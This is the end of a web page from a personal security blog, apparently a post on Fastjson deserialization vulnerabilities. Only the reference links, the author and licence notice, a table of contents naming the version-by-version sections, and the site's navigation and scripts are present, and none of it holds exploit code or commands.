<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/994/">Fastjson 流程分析及 RCE 分析</a></p>
<p><a target="_blank" rel="noopener" href="https://drops.blbana.cc/2020/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/">Fastjson反序列化漏洞基础</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1192/">Fastjson 反序列化漏洞史</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7878">某json &lt;= 1.2.68 远程代码执行漏洞分析</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Tyaoo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://tyaoo.github.io/2021/05/25/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/">https://tyaoo.github.io/2021/05/25/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/">漏洞研究</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/05/28/Laravel-Debug-mode-RCE%E5%A4%8D%E7%8E%B0/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Laravel Debug mode RCE复现</div></div></a></div><div class="next-post pull-right"><a href="/2021/05/12/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">内网穿透</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tyaoo</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Tyaoo"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E4%BE%9D%E8%B5%96"><span class="toc-number">1.</span> <span class="toc-text">安装依赖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%93%8D%E4%BD%9C"><span class="toc-number">2.2.</span> <span class="toc-text">反序列化操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="toc-number">2.3.</span> <span class="toc-text">反序列化流程图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">2.4.</span> <span class="toc-text">反序列化调用流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-24%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.</span> <span class="toc-text">1.2.24漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-41%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.</span> <span class="toc-text">1.2.41漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-42%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.</span> <span class="toc-text">1.2.42漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-43%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.4.</span> <span class="toc-text">1.2.43漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-45%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.5.</span> <span class="toc-text">1.2.45漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-47%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.6.</span> <span class="toc-text">1.2.47漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-62%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.7.</span> <span class="toc-text">1.2.62漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-66%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.8.</span> <span class="toc-text">1.2.66漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-68%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.9.</span> <span class="toc-text">1.2.68漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">漏洞总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">5.</span> <span class="toc-text">哈希黑名单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Tyaoo</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Local search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body></html>